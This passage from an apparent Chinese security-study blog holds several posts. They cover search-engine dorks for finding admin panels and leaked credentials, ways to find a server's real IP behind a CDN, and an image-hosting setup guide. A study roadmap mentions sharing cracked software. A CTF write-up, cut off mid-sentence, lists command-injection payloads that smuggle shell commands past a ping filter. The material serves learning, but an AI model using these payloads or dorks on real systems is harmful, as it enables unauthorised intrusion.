title="七、谷歌语法Github及利用方式"></a>七、谷歌语法Github及利用方式</h2><p>1、简单介绍<br>GoogleHack（谷歌语法）是指通过一系列指令在Google上进行信息搜索，从而<br>快速搜索到指定的目标。比如使用搜索包含指定url：inurl:xxx，搜索包含指定标<br>题：intitle:xxx。使用这种搜索方式通常可以避免大海捞针式的搜索目标，可以极<br>大的缩小搜索范围，甚至直接定位到自己想要的目标。同样的技巧还有很多，常<br>用的Github也可以实现。</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111423442.png" alt="image-20230724111423442"></p><h3 id="收集方式-6"><a href="#收集方式-6" class="headerlink" title="收集方式"></a>收集方式</h3><h4 id="google语法"><a href="#google语法" class="headerlink" title="google语法"></a>google语法</h4><p><a href="https://blog.csdn.net/u014565127/article/details/53842885?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166954324816782395317775%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166954324816782395317775&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-53842885-null-null.142%5Ev66%5Econtrol,201%5Ev3%5Econtrol_1,213%5Ev2%5Et3_esquery_v1&utm_term=%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95&spm=1018.2226.3001.4187">谷歌搜索语法（一）</a><br><a href="https://blog.csdn.net/u014565127/article/details/53868443">谷歌搜索语法（二）</a><br>常用技巧<br>查找后台地址：<br>site:域名<br>inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms<br>查找文本内容：<br>site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系<br>统|admin|login|sys|managetem|password|username<br>查找可注入点：<br>site:域名 inurl:aspx|jsp|php|asp<br>查找上传漏洞：<br>site:域名 inurl:file|load|editor|Files<br>找eweb编辑器：<br>site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit<br>存在的数据库：<br>site:域名 filetype:mdb|asp|#<br>查看脚本类型：<br>site:域名 filetype:asp&#x2F;aspx&#x2F;php&#x2F;jsp<br>迂回策略入侵：<br>inurl:cms&#x2F;data&#x2F;templates&#x2F;images&#x2F;index&#x2F;</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111443914.png" alt="image-20230724111443914"></p><h4 id="bing语法"><a href="#bing语法" class="headerlink" title="bing语法"></a>bing语法</h4><p>bing 搜索语法与 google类似<br>搜索引擎语法</p><h4 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h4><p>网址：<a href="https://fofa.info/">https://fofa.info/</a><br>高级搜索<br>&amp;&amp; &#x3D; and<br>可以使用括号 和 &amp;&amp; (与) 、|| (或)、 !&#x3D; (非)、等符号，如<br>title&#x3D;”powered by” &amp;&amp; title!&#x3D;”discuz”<br>body&#x3D;”content&#x3D;WordPress” || (header&#x3D;”X-Pingback” &amp;&amp; header&#x3D;”&#x2F;xmlrpc.php” &amp;&amp;<br>body&#x3D;”&#x2F;wp-includes&#x2F;“) &amp;&amp; host&#x3D;”gov.cn”<br>常用语法<br>domain&#x3D;”qq.com” #查询子域名<br>host&#x3D;”.gov.cn”   #从url中搜索”.gov.cn”<br>header&#x3D;”thinkphp” #从http头中搜索thinkphp<br>port&#x3D;”6379”       #查找对应“6379”端口的资产<br>ip&#x3D;”1.1.1.1”     #从ip中搜索包含“1.1.1.1”的网站<br>ip&#x3D;”220.181.111.1&#x2F;24”   #查询IP为“220.181.111.1”的C网段资产<br>status_code&#x3D;”402” #查询服务器状态为“402”的资产<br>app&#x3D;”通达OA网络智能办公系统”   # 搜索通达OA系统<br>country&#x3D;”CN”     # 搜索指定国家(编码)的资产<br>region&#x3D;”Henan”   # 搜索指定行政区的资产 </p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>360Quake<br><a href="https://quake.360.cn/">https://quake.360.cn/</a><br>奇安信鹰图<br><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><h3 id="利用方式-6"><a href="#利用方式-6" class="headerlink" title="利用方式"></a>利用方式</h3><p>通过Googlehack的搜索技巧，可以快速找到后台地址、敏感文件、测试环境、邮箱、QQ群、敏感接口等重要信息。<br>而在github上不仅可以找到很多网站、框架的源码等，也可以找到注入用户名、口令、数据库配置等信息，如下图所示敏感信息泄露和数据库配置泄露</p><h2 id="CDN识别-amp-amp-绕过"><a href="#CDN识别-amp-amp-绕过" class="headerlink" title="CDN识别&amp;&amp;绕过"></a>CDN识别&amp;&amp;绕过</h2><p>CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能<br>虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使<br>用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN系统能够实时地根据网<br>络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用<br>户最近的服务节点上，但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过<br>程。</p><h3 id="CDN识别"><a href="#CDN识别" class="headerlink" title="CDN识别"></a>CDN识别</h3><h4 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h4><p>GET 请求页面&#x2F;文件地址，查看 HTTP 响应头中是否存在 “cache xxx” 的值，若存在，则表示有走 CDN</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111504676.png" alt="image-20230724111504676"></p><h4 id="ping-域名"><a href="#ping-域名" class="headerlink" title="ping 域名"></a>ping 域名</h4><p>ping 域名，查看 ping 的实际地址，若实际地址为 CDN 节点地址，则表示有走 CDN</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111521686.png" alt="image-20230724111521686"></p><h4 id="nslookup-解析"><a href="#nslookup-解析" class="headerlink" title="nslookup 解析"></a>nslookup 解析</h4><p>nslookup 域名，若解析结果有多个，很有可能存在CDN，相反，若解析结果只有一个，可能不存在<br>CDN(不能肯定)</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111540281.png" alt="image-20230724111540281"></p><h4 id="多地-ping-最有效，最常用"><a href="#多地-ping-最有效，最常用" class="headerlink" title="多地 ping (最有效，最常用)"></a>多地 ping (最有效，最常用)</h4><p>利用多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致， 如果都是一<br>样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判<br>断是否存在CDN<br><a href="https://tool.chinaz.com/">https://tool.chinaz.com/</a></p><h4 id="CDN-厂商"><a href="#CDN-厂商" class="headerlink" title="CDN 厂商"></a>CDN 厂商</h4><p>CDN 厂商识别<br><a href="https://www.cdnplanet.com/tools/cdnfinder/#">https://www.cdnplanet.com/tools/cdnfinder/#</a><br><a href="http://tools.bugscaner.com/whichcdn/">http://tools.bugscaner.com/whichcdn/</a><br>国外厂商：CloudFlare、StackPath、Fastly、CDNetworks、CacheFly、CloudFront<br>国内厂商：阿里云CDN、Ucloud、Nodecache、腾讯云CDN、网宿CDN、白山CDN、金山CDN<br>CloudFlare <a href="https://gyzzwk.ml/">https://gyzzwk.ml/</a><br>StackPath <a href="https://151.139.113.56/">https://151.139.113.56/</a><br> Alibaba <a href="https://www.taobao.com/">https://www.taobao.com/</a><br>Wangsu <a href="https://www.chinaz.com/">https://www.chinaz.com</a><br>Tencent Cloud <a href="https://qq.com/">https://qq.com</a></p><h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><h4 id="1-子域名"><a href="#1-子域名" class="headerlink" title="1.子域名"></a>1.子域名</h4><p>CDN是付费的，一些网站主站因为业务需要可能做了CDN加速，但是其他域名可能没有做CDN加速<br>在线查询网站<br><a href="http://z.zcjun.com/">http://z.zcjun.com/</a><br><a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111605328.png" alt="image-20230724111605328"></p><h4 id="2-国外ping"><a href="#2-国外ping" class="headerlink" title="2.国外ping"></a>2.国外ping</h4><p><a href="https://check-host.net/check-ping">https://check-host.net/check-ping</a>?<br><a href="https://port.ping.pe/">https://port.ping.pe/</a></p><h4 id="3-历史DNS解析"><a href="#3-历史DNS解析" class="headerlink" title="3.历史DNS解析"></a>3.历史DNS解析</h4><p>dns历史记录 找最早的那一条<br>网上查找dns历史记录，找最早的那一条很大可能就是真实ip。<br>工具：<br><a href="https://viewdns.info/iphistory/?domain=">https://viewdns.info/iphistory/?domain=</a><br><a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a><br><a href="https://securitytrails.com/domain">https://securitytrails.com/domain</a><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a href="https://securitytrails.com/domain/baidu.com/history/a">https://securitytrails.com/domain/baidu.com/history/a</a><br><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a><br><a href="http://viewdns.info/">http://viewdns.info/</a><br><a href="http://www.17ce.com/">http://www.17ce.com/</a><br><a href="https://community.riskiq.com/">https://community.riskiq.com/</a><br><a href="http://www.crimeflare.com/cfssl.html">http://www.crimeflare.com/cfssl.html</a></p><h4 id="4-通过ico图标哈希"><a href="#4-通过ico图标哈希" class="headerlink" title="4.通过ico图标哈希"></a>4.通过ico图标哈希</h4><p>原理：图片有一串唯一的哈希，网络空间搜索引擎会收录全网ip信息进行排序收录，那么这些图标信息，也自然会采集在测绘解析的目标中。<br>工具：fofa<br>评价效果好</p><ol><li><p>找到网站的ico</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111632841.png" alt="image-20230724111632841"></p></li></ol><p>2.复制链接到fofa查找 得出哈希 找到真实网站</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111649994.png" alt="image-20230724111649994"></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111658364.png" alt="image-20230724111658364"></p><h4 id="5-利用邮件系统"><a href="#5-利用邮件系统" class="headerlink" title="5.利用邮件系统"></a>5.利用邮件系统</h4><p>目标服务器主动连接我们时，不会受到CDN影响<br>目标网站存在邮件验证等功能时，我们通过查看邮件源码，可能获取邮件服务器IP地址 及 发件人 IP地址<br>服务器IP: Received: from xxxxxx<br>发件人IP：X-Originating-IP</p><h4 id="6-通过网站证书"><a href="#6-通过网站证书" class="headerlink" title="6.通过网站证书"></a>6.通过网站证书</h4><p>1.找到证书</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111716045.png" alt="image-20230724111716045"><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111724713.png" alt="image-20230724111724713"></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111757378.png" alt="image-20230724111757378"></p><p>2.找到序列号</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111831773.png" alt="image-20230724111831773"></p><p>3.将16进制序列号转换为10进制</p><p><code>注意要去掉中间的：为 06A7F42683CEDB9A23FAE9EF850BE797 https://tool.lu/hexconvert/     #测试该网站没问题</code> </p><p>注意：有些在线进制转换网站 16进制转换为10进制结果有问题，会导致fofa查不出来。<br>比如</p><p><a href="https://www.sojson.com/hexconvert/16to10.html">https://www.sojson.com/hexconvert/16to10.html</a>  # 别用这个网址  查出的有误</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724111953002.png" alt="image-20230724111953002"></p><p>4.去fofa搜索</p><p><code>#cert=&quot;8847433509490890048103502099598010263&quot;</code> </p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724112029555.png" alt="image-20230724112029555"></p><p>查询成功</p><h4 id="7-ssl证书查询"><a href="#7-ssl证书查询" class="headerlink" title="7.ssl证书查询"></a>7.ssl证书查询</h4><p>查询证书相关站点，可能找到对应真实ip<br>工具：<a href="https://censys.io/certificates?q=">https://censys.io/certificates?q=</a><br><a href="https://myssl.com/">https://myssl.com/</a><br><a href="https://crt.sh/">https://crt.sh/</a><br><a href="https://censys.io/">https://censys.io/</a><br><a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a><br><a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p><ol><li><p>输入语法： parsed.names: <a href="http://www.xxx.com/">www.xxx.com</a> and tags.raw: trusted</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724112053986.png" alt="image-20230724112053986"></p></li></ol><p>2.找到IPv4 Hosts,点进去</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724112114418.png" alt="image-20230724112114418"></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724112121902.png" alt="image-20230724112121902"></p><h4 id="8-http数据包查看"><a href="#8-http数据包查看" class="headerlink" title="8.http数据包查看"></a>8.http数据包查看</h4><p>（1）查找其中的http标头，再放入censys中搜索参数，如cloudflare的http标头为80.http.get.headers.server:cloudflare，找到后寻找其他特征，最终找到交集获得真实IP。<br>（2）查找cookie值并使用F5 LTM解码法，如cookie值为BIGipServerpool_8.29_8030&#x3D;487098378.24095.0000，把第一小节的十进制数487098378提取出来，再转十六进制，接着从后至前为0a.88.08.1d，转十进制数为10.136.8.29，得到最后的真实IP。<br>（3）查找网站源代码和返回包，如使用80.http.get.body和http.html来进行搜索。</p><h4 id="9-利用app端"><a href="#9-利用app端" class="headerlink" title="9.利用app端"></a>9.利用app端</h4><p>通过抓包工具来抓取APP的请求包，寻找真实IP。</p><h4 id="10-去掉3W"><a href="#10-去掉3W" class="headerlink" title="10.去掉3W"></a>10.去掉3W</h4><h4 id="11-碰运气"><a href="#11-碰运气" class="headerlink" title="11.碰运气"></a>11.碰运气</h4><p>在线查询网站<br><a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>评价：本方法效果一般，但无成本</p><h4 id="12-服务器所在城市ping-不确定"><a href="#12-服务器所在城市ping-不确定" class="headerlink" title="12.服务器所在城市ping(不确定)"></a>12.服务器所在城市ping(不确定)</h4><p>原理：站长并没有在服务器所在的城市做CDN。</p><h4 id="13-通过网页漏洞获取"><a href="#13-通过网页漏洞获取" class="headerlink" title="13.通过网页漏洞获取"></a>13.通过网页漏洞获取</h4><p>如果目标站点存在漏洞，这就没办法避免了。例如phpinfo敏感信息泄露、Apache status和Jboss status敏感信息泄露、网页源代码泄露、svn信息泄露信、github信息泄露等。<br>若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。</p><h4 id="14-网络空间引擎搜索法"><a href="#14-网络空间引擎搜索法" class="headerlink" title="14.网络空间引擎搜索法"></a>14.网络空间引擎搜索法</h4><p>zoomeye、fofa、shodan<br>通过这些公开的安全搜索引擎爬取得历史快照，主要得一些特征总结如下：<br>特有的http头部（如server类型、版本、cookie等信息)、<br>特定keyword（如title、css、js、url等）、<br>特定的IP段搜索（如fofa支持C段搜索），<br>有些时候爬取的时候不一定含有上面那些特征，但是我们仍然需要仔细排查。<br>获取到真实ip后<br>浏览器访问ip尝试<br>如果目标网站 做了域名绑定，直接访问IP访问不成功。</p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云cos搭建图床</title>
      <link href="/2023/07/15/teng-xun-yun-cos-picgo-typora-gao-ding-ge-ren-bo-ke-tu-chuang/"/>
      <url>/2023/07/15/teng-xun-yun-cos-picgo-typora-gao-ding-ge-ren-bo-ke-tu-chuang/</url>
      
        <content type="html"><![CDATA[<p><a name="l1KXQ"></a></p><h2 id="一、腾讯云配置"><a href="#一、腾讯云配置" class="headerlink" title="一、腾讯云配置"></a><strong>一、腾讯云配置</strong></h2><p>腾讯云对象存储COS有50G免费流量资源包赠送有效期6个月<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725101020605.png" alt="image-20230725101020605"><br />没有注册过腾讯云的先注册，之后实名认证就可以使用了<br />腾讯云COS图片存储是收费的，具体的收费方式看<a href="https://link.zhihu.com/?target=https://cloud.tencent.com/document/product/436/16871">官网</a><br><a name="nLSBt"></a></p><h3 id="1-前往对象存储页面，创建存储桶"><a href="#1-前往对象存储页面，创建存储桶" class="headerlink" title="1.前往对象存储页面，创建存储桶"></a><strong>1.前往对象存储页面，创建存储桶</strong></h3><p>访问腾讯云对象存储COS的控制台，进入 <a href="https://link.zhihu.com/?target=https://console.cloud.tencent.com/cos5/bucket">存储桶列表</a> 页面<br />对于没有登录的用户，需要先进行登录和授权操作。如果已经完成登录<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725101032118.png" alt="image-20230725101032118"></p><ul><li>访问权限选择<strong>公有读私有写</strong>，否则图片无法读取，其他的根据自己往下填写就可以。</li><li>地域选为自己所属的。<br><a name="y0sOm"></a></li></ul><h3 id="2-在存储桶中创建文件夹"><a href="#2-在存储桶中创建文件夹" class="headerlink" title="2.在存储桶中创建文件夹"></a><strong>2.在存储桶中创建文件夹</strong></h3><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725101044424.png" alt="image-20230725101044424"><br />完成文件夹创建的目录中，可以同时获取到存储桶名和文件夹名<br />可以先记住这两个参数的获取位置，等到接下来进行参数配置的时候，直接前往对应页面获取即可。<br />除此之外，还需要获取存储桶的所属区域，可以在存储桶列表页点击右侧的 “配置管理” 获取，可以在 “基本信息” 中获取所属区域<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725101054243.png" alt="image-20230725101054243"><br><a name="wnWqT"></a></p><h3 id="3-获取用户密钥配置"><a href="#3-获取用户密钥配置" class="headerlink" title="3.获取用户密钥配置"></a><strong>3.获取用户密钥配置</strong></h3><p>点击【密钥管理】→【云API密钥】→【新建密钥】<br />获取到用户密钥（需要获取的信息为SecretId和SecretKey）<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725101104495.png" alt="image-20230725101104495"><br><a name="g43PT"></a></p><h2 id="二、配置PicGo"><a href="#二、配置PicGo" class="headerlink" title="二、配置PicGo"></a><strong>二、配置PicGo</strong></h2><p>PicGo 是一款开源跨平台的免费图片上传工具以及图床相册管理软件，它能帮你快速地将图片上传到微博、又拍云、阿里云 OSS、腾讯云 COS、七牛、GitHub、sm.ms、Imgur 等常见的免费图床网站或云存储服务上，并自动复制图片的链接到剪贴板里，使用上非常高效便捷。<br><a name="hapyP"></a></p><h2 id="1-下载PicGo"><a href="#1-下载PicGo" class="headerlink" title="1.下载PicGo"></a><strong>1.下载PicGo</strong></h2><p>首先进入<a href="https://link.zhihu.com/?target=https://github.com/Molunerfinn/PicGo/releases">PicGo-Github项目地址</a>下载相应版本：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725101113784.png" alt="image-20230725101113784"><br />Windows下载红框的版本，Linux、mac都有标明。<br><a name="xBLXg"></a></p><h2 id="2-配置PicGo"><a href="#2-配置PicGo" class="headerlink" title="2.配置PicGo"></a><strong>2.配置PicGo</strong></h2><p>打开软件，点击【腾讯云COS】，填入我们上面创建的信息：<br />API密钥 SecretId和SecretKey<br />APPID：即账号ID<br />存储空间名即存储桶名<br />COS版本选v5<br />路径带typora&#x2F;，跟腾讯云COS一致<br />记得设为默认图床，否则上传不会默认走腾讯云COS<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725101125698.png" alt="image-20230725101125698"><br />拖拽图片到图片上传区即可上传<br><a name="zOnMN"></a></p><h2 id="三、typora配置PicGo自动上传"><a href="#三、typora配置PicGo自动上传" class="headerlink" title="三、typora配置PicGo自动上传"></a><strong>三、typora配置PicGo自动上传</strong></h2><p>点击【文件】→【偏好设置】→【图像】<br />配置成如下即可在typora插入图片的时候自动上传<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725101929404.png" alt="image-20230725101929404"></p>]]></content>
      
      
      <categories>
          
          <category> 腾讯云cos+PicGo+typora搭建个人博客图床 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
            <tag> PicGo </tag>
            
            <tag> typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网安学习</title>
      <link href="/2023/07/12/wang-an-xue-xi-lu-xian/"/>
      <url>/2023/07/12/wang-an-xue-xi-lu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="网安学习路线"><a href="#网安学习路线" class="headerlink" title="网安学习路线"></a>网安学习路线</h1><p>首先要安装大量软件，如果有没用硬盘的话，在那个没用的硬盘里创一个文件夹，把用的软件都放进去，（方便找，或者以后换硬盘换电脑时移动）这是第一步，也是很折磨的一步，过程中会出现很多非预期的问题报错等，耐下性子忍过去，有问题一起解决。</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230706140613757.png"></p><p>软件我放到阿里云盘里面了，百度限速，一直充会员也不现实）</p><p><a href="https://github.com/ProbiusOfficial/SecTool">探姬整合的工具箱</a>  这个让后续的新人用！</p><p><a href="https://www.ltsec.com/p/t_pc/course_pc_detail/column/p_6225acf8e4b02b825851e730">渗透攻防环境搭建 (ltsec.com)</a></p><p>这个是安装软件的教程，根据这个对应着来就行，如果有跟视频不一样的，再问我。（里面的xshell，xftp，navicat，typora不用安装，因为收费只能试用，我这有破解版的，我放到破解软件文件夹里面了）</p><p>安装视频中有web的几个经典靶场，如果大家不想安装的话，上咱学校的靶场平台也可以</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725183414894.png" alt="image-20230725183414894"></p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725183508666.png" alt="image-20230725183508666"></p><p>靶场平台都是探姬自己整的，留给学弟学妹用，他真的，我哭死。以后可能也会ctf周赛的举办。</p><p><a href="https://www.ltsec.com/p/t_pc/course_pc_detail/big_column/p_63be5ecee4b07b05582dc8ed">连天教育-网络安全红队特训营 (ltsec.com)</a></p><p>这是培训课程，当时两千多买的，现在公开了，可恶呀，信息收集之前为第一阶段，也就是前置基础，里面有咱部门培训的前端，操作系统，大二上学期学的计算机网络部分知识，以及php，python（python要好好学，以后很多东西都需要自己写脚本的，我最想学的编程语言就是python）</p><p>课件我也放入网盘中了，学完基础就该正式接触web安全了，各种漏洞知识，在安装软件的时候，会有几个web靶场，那是经典的几个网上公开的靶场，根据视频，可以配套练，寒假的时候，为了打ctf，我买了一个ctf平台的会员，大二就该你们自己打比赛了，要多练。以后打比赛，你们主力，记得带我，我累了。。。</p><p>说起ctf，建议大家看一下探姬的 <a href="https://ctf.tj.cn/">博客</a> 探姬也属的上咱学校网安的第一人，引路人了，帮助我很多！！！</p><p><a href="https://ctf.show/">https://ctf.show/</a>  账号：   密码：  （再次叮嘱，勿传！！！）</p><p>我上课的时候，老师会留作业文档给我们，想根据课程写作业的话，找我要。</p><p>强调一下，网安很碎，需要学好多东西，要学会做笔记，笔记方面我用的语雀这个软件</p><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230706135643140.png"></p><p>大大小小也做了好多了，你们一定一定要做，我们都不是天才！</p><p><a href="https://www.yuque.com/xiaoyao-bkcig/ibb3li/ainzxdfvn61rnx89">信息收集 (yuque.com)</a></p><p><a href="https://www.yuque.com/xiaoyao-bkcig/ibb3li/iagf1nfd7yduldr4">sql注入 (yuque.com)</a></p><p><a href="https://www.yuque.com/xiaoyao-bkcig/ibb3li/cxvltmwoom3lrsek">文件上传 (yuque.com)</a></p><p><a href="https://www.yuque.com/xiaoyao-bkcig/ibb3li/pwz2r8hdrbch00gb">文件包含 (yuque.com)</a></p><p><a href="https://www.yuque.com/xiaoyao-bkcig/ibb3li/igkuva7gggtmqoav">XSS (yuque.com)</a></p><p>以上几个是我借鉴然后整的笔记，你们可以参考然后拿来用。</p><p>我的能力有限，只能帮到这了，再后面虽然也有资源，但还没学，学了再告诉你们吧，暑假两个月能把这学完已经很好了，我们当时计划的是三个月。你们两个好好学，希望有所收获！</p><p>高中的时候，喜欢一句话：吾辈皆身于沟渠之中，然其必有仰望星空者也！</p><p>希望再见面时，都能独挡一面，期待笑的姿态见面!</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行绕过</title>
      <link href="/2023/07/10/ming-ling-zhi-xing-de-rao-guo-zi-shi/"/>
      <url>/2023/07/10/ming-ling-zhi-xing-de-rao-guo-zi-shi/</url>
      
        <content type="html"><![CDATA[<p>先看题目<br><a name="F4St5"></a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725105410894.png" alt="image-20230725105410894"><br />题目很单一，目的就是为了让我们通过参数传入内容来执行代码。因为题目是与ping有关，当我们输入127.0.0.1时，它会进行<a href="https://so.csdn.net/so/search?q=ping%E5%91%BD%E4%BB%A4&spm=1001.2101.3001.7020">ping命令</a>操作。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725105424253.png" alt="image-20230725105424253"><br />一般根据ping命令相关的命令执行，正常情况有五种写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">127.0.0.1&amp;&amp;+code  只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。</span><br><span class="line">127.0.0.1&amp;+code  &amp;表示将任务置于后台执行</span><br><span class="line">127.0.0.1||+code  只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。</span><br><span class="line">127.0.0.1|+code  | 表示管道，上一条命令的输出，作为下一条命令的参数</span><br><span class="line">127.0.0.1;+code  多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br></pre></td></tr></table></figure><p>而本题就是要用到第五种。输入127.0.0.1;whoami 它会回显出用户名www-data，说明命令执行成功。接着用<a href="https://so.csdn.net/so/search?q=ls%E5%91%BD%E4%BB%A4&spm=1001.2101.3001.7020">ls命令</a>查看当前目录文件，输入命令127.0.0.1;ls<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725105437461.png" alt="image-20230725105437461"><br />发现当前目录下有flag.php和index.php。我们试着读取index.php文件的源码，看看它都过滤了什么。试了很多次，发现你过滤了空格。<br><a name="dKkGB"></a></p><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><p>其实我们可以用一些字符来代替空格，windows系统与linux系统有些差异。<br />Windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type.\flag.txt</span><br><span class="line">type,flag.txt</span><br><span class="line">echo,123456</span><br></pre></td></tr></table></figure><p>linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat$IFS$1flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">%09替换</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure><p>其实windows系统的命令不太常用，赛题中也很少出现。这题也不例外。这道题中我们可以使用<br />$IFS$1来代替空格，使用cat命令来查看index.php文件的源码。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725105448971.png" alt="image-20230725105448971"><br />发现它过滤了很多东西 包括一些字符还有整个flag。<br><a name="Bj0kD"></a></p><h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><p>在linux系统中，反引号是作为内联执行，输出查询结果的内容。比如用ls查询出index.php。那么<code>ls</code>就代表了index.php这个文件。那么我们就可以使用cat命令查看index.php的内容，而这一道题就可以使用cat$IFS$1<code>ls</code>  这个命令来输出flag了。<br />查看源代码内容就可以找到flag。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725105504012.png" alt="image-20230725105504012"><br><a name="mp1Mi"></a></p><h3 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h3><p>看了师傅们的WP后，知道可以使用变量拼接的方法来绕过flag这个关键字。<br 